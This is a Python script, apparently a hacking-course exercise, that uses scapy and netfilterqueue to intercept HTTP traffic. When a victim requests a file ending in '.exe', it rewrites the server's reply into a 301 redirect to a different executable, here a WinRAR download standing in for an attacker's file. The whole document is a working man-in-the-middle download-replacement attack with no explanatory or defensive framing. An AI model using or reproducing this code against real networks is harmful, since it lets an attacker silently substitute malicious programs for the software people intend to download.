#!/usr/bin/env python3

from struct import pack
import netfilterqueue
import scapy.all as scapy

ack_list = []


def get_modified_packet(packet):
    ack_list.remove(packet[scapy.TCP].seq)
    print('[+] replacing file')
    packet[scapy.Raw].load = 'HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-611.exe\n\n'
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        if scapy_packet[scapy.TCP].dport == 80:
            if '.exe' in str(scapy_packet[scapy.Raw].load):
                print('[+] .exe request')
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                modified_packet = get_modified_packet(scapy_packet)
                packet.set_payload(bytes(modified_packet))
                print(modified_packet.show())

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
